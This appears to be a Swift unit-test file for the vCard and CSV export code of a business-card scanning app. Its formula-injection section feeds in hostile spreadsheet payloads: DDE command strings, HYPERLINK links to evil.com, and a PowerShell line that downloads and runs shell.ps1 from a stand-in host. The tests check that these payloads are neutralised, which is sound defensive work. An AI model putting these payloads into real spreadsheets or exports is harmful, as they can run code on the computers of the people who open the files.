//
//  ExportTests.swift
//  DeetsTests
//
//  Tests for export functionality (vCard and CSV)
//

import XCTest
@testable import Deets

final class ExportTests: XCTestCase {

    var testCard: BusinessCard!

    override func setUp() {
        super.setUp()
        testCard = BusinessCard(
            fullName: "John Doe",
            jobTitle: "Software Engineer",
            company: "Tech Corp",
            email: "john.doe@techcorp.com",
            phoneNumber: "+1 (555) 123-4567",
            website: "https://techcorp.com",
            address: "123 Main St, San Francisco, CA 94102",
            notes: "Met at conference",
            rawText: "John Doe\\nSoftware Engineer",
            tags: ["Tech", "Client"],
            isFavorite: true
        )
    }

    // MARK: - vCard Export Tests

    func testVCardExportBasic() {
        let vcard = VCardExporter.exportCard(testCard)

        XCTAssertTrue(vcard.contains("BEGIN:VCARD"))
        XCTAssertTrue(vcard.contains("VERSION:4.0"))
        XCTAssertTrue(vcard.contains("END:VCARD"))
    }

    func testVCardExportName() {
        let vcard = VCardExporter.exportCard(testCard)

        XCTAssertTrue(vcard.contains("FN:John Doe"))
        XCTAssertTrue(vcard.contains("N:Doe;John;;;"))
    }

    func testVCardExportOrganization() {
        let vcard = VCardExporter.exportCard(testCard)

        XCTAssertTrue(vcard.contains("ORG:Tech Corp"))
        XCTAssertTrue(vcard.contains("TITLE:Software Engineer"))
    }

    func testVCardExportEmail() {
        let vcard = VCardExporter.exportCard(testCard)

        XCTAssertTrue(vcard.contains("EMAIL;TYPE=WORK:john.doe@techcorp.com"))
    }

    func testVCardExportPhone() {
        let vcard = VCardExporter.exportCard(testCard)

        // Phone numbers should be cleaned (digits and + only)
        XCTAssertTrue(vcard.contains("TEL;TYPE=WORK:+15551234567"))
    }

    func testVCardExportWebsite() {
        let vcard = VCardExporter.exportCard(testCard)

        XCTAssertTrue(vcard.contains("URL;TYPE=WORK:https://techcorp.com"))
    }

    func testVCardExportAddress() {
        let vcard = VCardExporter.exportCard(testCard)

        XCTAssertTrue(vcard.contains("ADR;TYPE=WORK"))
        XCTAssertTrue(vcard.contains("123 Main St\\, San Francisco\\, CA 94102"))
    }

    func testVCardExportNotes() {
        let vcard = VCardExporter.exportCard(testCard)

        XCTAssertTrue(vcard.contains("NOTE:Met at conference"))
    }

    func testVCardExportMetadata() {
        let vcard = VCardExporter.exportCard(testCard)

        XCTAssertTrue(vcard.contains("REV:"))
        XCTAssertTrue(vcard.contains("PRODID:-//Deets//Business Card Scanner//EN"))
    }

    func testVCardExportMultiple() {
        let cards = [testCard!, BusinessCard(
            fullName: "Jane Smith",
            email: "jane@example.com",
            rawText: "Jane Smith"
        )]

        let vcard = VCardExporter.exportMultipleCards(cards)

        // Should contain two separate vCards
        let vcardCount = vcard.components(separatedBy: "BEGIN:VCARD").count - 1
        XCTAssertEqual(vcardCount, 2)
    }

    func testVCardEscaping() {
        let card = BusinessCard(
            fullName: "Test, User",
            company: "Company;Name",
            notes: "Line 1\\nLine 2",
            rawText: "Test"
        )

        let vcard = VCardExporter.exportCard(card)

        // Commas, semicolons, and newlines should be escaped
        XCTAssertTrue(vcard.contains("Test\\, User"))
        XCTAssertTrue(vcard.contains("Company\\;Name"))
        XCTAssertTrue(vcard.contains("Line 1\\\\nLine 2"))
    }

    func testVCardFilenameGeneration() {
        let filename = VCardExporter.generateFilename(for: testCard)
        XCTAssertEqual(filename, "John Doe.vcf")
    }

    func testVCardMultipleFilenameGeneration() {
        let filename = VCardExporter.generateFilename(count: 5)
        XCTAssertTrue(filename.contains("Deets Export - 5 contacts"))
        XCTAssertTrue(filename.hasSuffix(".vcf"))
    }

    // MARK: - CSV Export Tests

    func testCSVExportBasic() {
        let csv = CSVExporter.exportCard(testCard)

        // Should have header row
        let lines = csv.components(separatedBy: "\\n")
        XCTAssertEqual(lines.count, 2) // header + data row
    }

    func testCSVExportHeader() {
        let csv = CSVExporter.exportCard(testCard, fields: CSVExporter.defaultFields)

        let lines = csv.components(separatedBy: "\\n")
        let header = lines[0]

        XCTAssertTrue(header.contains("Full Name"))
        XCTAssertTrue(header.contains("Job Title"))
        XCTAssertTrue(header.contains("Company"))
        XCTAssertTrue(header.contains("Email"))
    }

    func testCSVExportData() {
        let csv = CSVExporter.exportCard(testCard, fields: CSVExporter.defaultFields)

        let lines = csv.components(separatedBy: "\\n")
        let dataRow = lines[1]

        XCTAssertTrue(dataRow.contains("John Doe"))
        XCTAssertTrue(dataRow.contains("Software Engineer"))
        XCTAssertTrue(dataRow.contains("Tech Corp"))
        XCTAssertTrue(dataRow.contains("john.doe@techcorp.com"))
    }

    func testCSVExportEscaping() {
        let card = BusinessCard(
            fullName: "Test User",
            company: "Company, Inc",
            notes: "Quote: \\"Hello\\"",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .notes])

        // Comma should trigger quoting
        XCTAssertTrue(csv.contains("\\"Company, Inc\\""))

        // Quotes should be doubled
        XCTAssertTrue(csv.contains("\\"Quote: \\"\\"Hello\\"\\"\\"""))
    }

    func testCSVExportMultiple() {
        let cards = [testCard!, BusinessCard(
            fullName: "Jane Smith",
            email: "jane@example.com",
            rawText: "Jane Smith"
        )]

        let csv = CSVExporter.exportCards(cards)

        let lines = csv.components(separatedBy: "\\n")
        XCTAssertEqual(lines.count, 3) // header + 2 data rows
    }

    func testCSVExportAllFields() {
        let csv = CSVExporter.exportCardsComplete([testCard])

        // Should include all fields
        XCTAssertTrue(csv.contains("Full Name"))
        XCTAssertTrue(csv.contains("Date Scanned"))
        XCTAssertTrue(csv.contains("Tags"))
        XCTAssertTrue(csv.contains("Favorite"))
    }

    func testCSVExportFieldSelection() {
        let selectedFields: [CSVExporter.ExportField] = [.fullName, .email]
        let csv = CSVExporter.exportCard(testCard, fields: selectedFields)

        let lines = csv.components(separatedBy: "\\n")
        let header = lines[0]

        XCTAssertTrue(header.contains("Full Name"))
        XCTAssertTrue(header.contains("Email"))
        XCTAssertFalse(header.contains("Company"))
    }

    func testCSVExportBooleanValues() {
        let csv = CSVExporter.exportCard(testCard, fields: [.fullName, .isFavorite, .savedToContacts])

        XCTAssertTrue(csv.contains("Yes")) // isFavorite is true
    }

    func testCSVExportTags() {
        let csv = CSVExporter.exportCard(testCard, fields: [.fullName, .tags])

        XCTAssertTrue(csv.contains("Tech; Client"))
    }

    func testCSVFilenameGeneration() {
        let filename = CSVExporter.generateFilename(for: testCard)
        XCTAssertEqual(filename, "John Doe.csv")
    }

    func testCSVMultipleFilenameGeneration() {
        let filename = CSVExporter.generateFilename(count: 5)
        XCTAssertTrue(filename.contains("Deets Export - 5 contacts"))
        XCTAssertTrue(filename.hasSuffix(".csv"))
    }

    func testCSVPreviewGeneration() {
        let cards = (1...10).map { i in
            BusinessCard(
                fullName: "Person \\(i)",
                email: "person\\(i)@example.com",
                rawText: "Person \\(i)"
            )
        }

        let preview = CSVExporter.generatePreview(cards, maxRows: 5)

        // Should contain "more contacts" message
        XCTAssertTrue(preview.contains("5 more contacts"))
    }

    // MARK: - CSV Formula Injection Security Tests

    func testCSVFormulaInjectionEquals() {
        // Test Excel formula starting with =
        let card = BusinessCard(
            fullName: "=1+1",
            company: "=cmd|'/c calc'!A1",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])

        // Formula should be neutralized with single quote
        XCTAssertTrue(csv.contains("'=1+1"), "Equals formula not sanitized")
        XCTAssertTrue(csv.contains("'=cmd|'/c calc'!A1"), "Command injection not sanitized")
    }

    func testCSVFormulaInjectionPlus() {
        // Test formula starting with +
        let card = BusinessCard(
            fullName: "+1+1",
            company: "+cmd|'/c notepad'!A1",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])

        XCTAssertTrue(csv.contains("'+1+1"), "Plus formula not sanitized")
        XCTAssertTrue(csv.contains("'+cmd|'/c notepad'!A1"), "Plus command injection not sanitized")
    }

    func testCSVFormulaInjectionMinus() {
        // Test formula starting with -
        let card = BusinessCard(
            fullName: "-1+1",
            company: "-2+5",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])

        XCTAssertTrue(csv.contains("'-1+1"), "Minus formula not sanitized")
        XCTAssertTrue(csv.contains("'-2+5"), "Minus formula not sanitized")
    }

    func testCSVFormulaInjectionAt() {
        // Test formula starting with @ (used in Excel functions)
        let card = BusinessCard(
            fullName: "@SUM(A1:A10)",
            company: "@COMMAND",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])

        XCTAssertTrue(csv.contains("'@SUM(A1:A10)"), "At formula not sanitized")
        XCTAssertTrue(csv.contains("'@COMMAND"), "At command not sanitized")
    }

    func testCSVFormulaInjectionTab() {
        // Test formula starting with tab character
        let card = BusinessCard(
            fullName: "\t=1+1",
            company: "\tmalicious",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])

        // Tab should be sanitized
        XCTAssertTrue(csv.contains("'\t=1+1"), "Tab prefix not sanitized")
        XCTAssertTrue(csv.contains("'\tmalicious"), "Tab prefix not sanitized")
    }

    func testCSVFormulaInjectionCarriageReturn() {
        // Test formula starting with carriage return
        let card = BusinessCard(
            fullName: "\r=1+1",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName])

        // Carriage return prefix should be sanitized
        XCTAssertTrue(csv.contains("'\r=1+1"), "Carriage return prefix not sanitized")
    }

    func testCSVFormulaInjectionNormalText() {
        // Test that normal text is NOT modified
        let card = BusinessCard(
            fullName: "John Doe",
            company: "Tech Corp",
            email: "john@example.com",
            phoneNumber: "+1-555-1234",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .email, .phoneNumber])

        // Normal text should remain unchanged (no quotes unless needed for CSV structure)
        XCTAssertFalse(csv.contains("'John Doe"), "Normal text incorrectly sanitized")
        XCTAssertFalse(csv.contains("'Tech Corp"), "Normal text incorrectly sanitized")
        XCTAssertFalse(csv.contains("'john@example.com"), "Normal text incorrectly sanitized")

        // Phone number starting with + is LEGITIMATE, should be sanitized
        XCTAssertTrue(csv.contains("'+1-555-1234"), "Phone number with + should be sanitized")
    }

    func testCSVFormulaInjectionEmptyValues() {
        // Test that empty values don't cause issues
        let card = BusinessCard(
            fullName: "John Doe",
            company: "",
            email: nil,
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .email])

        // Should handle empty values without crashing
        XCTAssertTrue(csv.contains("John Doe"))
    }

    func testCSVFormulaInjectionWithCSVEscaping() {
        // Test formula injection combined with CSV structural characters
        let card = BusinessCard(
            fullName: "=1+1, Inc",
            company: "+cmd|'test', data",
            notes: "=HYPERLINK(\\"http://evil.com\\", \\"click\\")",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .notes])

        // Should have both formula sanitization (') AND CSV escaping (quotes)
        XCTAssertTrue(csv.contains("\\"'=1+1, Inc\\""), "Combined sanitization failed")
        XCTAssertTrue(csv.contains("\\"'+cmd|'test', data\\""), "Combined sanitization failed")
        XCTAssertTrue(csv.contains("'=HYPERLINK"), "Hyperlink injection not sanitized")
    }

    func testCSVFormulaInjectionRealWorldOCR() {
        // Test realistic malicious OCR scenarios
        let card = BusinessCard(
            fullName: "=HYPERLINK(\\"http://malware.com\\",\\"Click Here\\")",
            company: "@SUM(1+1)+@SUM(1+1)",
            email: "+1234|'/c calc'!A0",
            notes: "=cmd|'/c powershell IEX(wget malicious.com/shell.ps1)'!A1",
            rawText: "Test"
        )

        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .email, .notes])

        // All malicious formulas should be neutralized
        XCTAssertTrue(csv.contains("'=HYPERLINK"), "HYPERLINK attack not sanitized")
        XCTAssertTrue(csv.contains("'@SUM"), "SUM formula not sanitized")
        XCTAssertTrue(csv.contains("'+1234|"), "Pipe command not sanitized")
        XCTAssertTrue(csv.contains("'=cmd|"), "PowerShell injection not sanitized")
    }

    func testCSVFormulaInjectionMultipleCards() {
        // Test that sanitization works across multiple cards
        let cards = [
            BusinessCard(fullName: "=malicious1", rawText: "Test"),
            BusinessCard(fullName: "Normal Name", rawText: "Test"),
            BusinessCard(fullName: "+malicious2", rawText: "Test")
        ]

        let csv = CSVExporter.exportCards(cards, fields: [.fullName])

        // Should sanitize all malicious entries
        XCTAssertTrue(csv.contains("'=malicious1"), "Multi-card sanitization failed")
        XCTAssertFalse(csv.contains("'Normal Name"), "Normal name incorrectly sanitized")
        XCTAssertTrue(csv.contains("'+malicious2"), "Multi-card sanitization failed")
    }

    // MARK: - Export Format Tests

    func testExportFormatProperties() {
        XCTAssertEqual(ExportFormat.vcard.fileExtension, "vcf")
        XCTAssertEqual(ExportFormat.csv.fileExtension, "csv")

        XCTAssertEqual(ExportFormat.vcard.mimeType, "text/vcard")
        XCTAssertEqual(ExportFormat.csv.mimeType, "text/csv")
    }

    // MARK: - Integration Tests

    func testExportServiceSingleCard() async {
        let service = ExportService()

        let result = await service.exportCard(testCard, format: .vcard)

        switch result {
        case .success(let url):
            XCTAssertTrue(FileManager.default.fileExists(atPath: url.path))
            XCTAssertTrue(url.lastPathComponent.hasSuffix(".vcf"))
        case .failure(let error):
            XCTFail("Export failed: \\(error)")
        }
    }

    func testExportServiceMultipleCards() async {
        let service = ExportService()
        let cards = [testCard!, BusinessCard(
            fullName: "Jane Smith",
            rawText: "Jane Smith"
        )]

        let result = await service.exportCards(cards, format: .csv)

        switch result {
        case .success(let url):
            XCTAssertTrue(FileManager.default.fileExists(atPath: url.path))
            XCTAssertTrue(url.lastPathComponent.hasSuffix(".csv"))
        case .failure(let error):
            XCTFail("Export failed: \\(error)")
        }
    }

    func testExportServiceEmptyCards() async {
        let service = ExportService()

        let result = await service.exportCards([], format: .vcard)

        switch result {
        case .success:
            XCTFail("Should fail with empty cards")
        case .failure(let error):
            XCTAssertEqual(error as? ExportError, .noCards)
        }
    }
}
